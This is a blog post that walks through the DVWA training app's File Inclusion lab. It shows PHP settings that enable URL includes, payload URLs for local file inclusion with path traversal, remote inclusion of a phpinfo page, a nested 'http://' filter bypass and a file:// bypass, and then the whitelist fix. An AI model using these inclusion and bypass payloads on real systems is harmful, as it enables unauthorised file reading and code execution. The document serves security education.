---
layout: post
title: "File Inclusion"
date: 2020-08-02T15:32:25+08:00
---

<https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/fi/index.php>

## allow-url-include

```bash
vi /etc/php/7.2/apache2/php.ini
```

```txt
; Whether to allow the treatment of URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-fopen
allow_url_fopen = On

; Whether to allow include/require to open URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-include
allow_url_include = On
```

## php include function

<https://www.php.net/manual/en/function.include.php>

> The include statement includes and evaluates the specified file.

```
if( isset( $file ) )
	include( $file );
```

## Low

```
// The page we wish to display
$file = $_GET[ 'page' ];
```

### local file inclusion

<http://localhost:8080/DVWA/vulnerabilities/fi/?page=file4.php>

Or even more, we can 

<http://localhost:8080/DVWA/vulnerabilities/fi/?page=../../.htaccess>

### remote file inclusion

We can provide a `phpinfo.php` at some `http://` url by python SimpleHTTPServer:

```
<?php

echo phpinfo()

?> 
```

```
python -m SimpleHTTPServer
```

Then access:

<http://localhost:8080/DVWA/vulnerabilities/fi/?page=http://localhost:8000/phpinfo.php>

## Medium

```
// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```

We can just insert one more `http://` between the original `http://` string. For example:

<http://localhost:8080/DVWA/vulnerabilities/fi/?page=hthttp://tp://localhost:8000/phpinfo.php>

## High

```
// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
	// This isn't the page we want!
	echo "ERROR: File not found!";
	exit;
}
```

Local file is still accessible using `file://` protocol:

<http://localhost:8080/DVWA/vulnerabilities/fi/?page=file:///var/www/html/phpinfo.php>.

## Impossible

```
// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
	// This isn't the page we want!
	echo "ERROR: File not found!";
	exit;
}
```

## Reference

<https://wooyun.js.org/drops/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.html>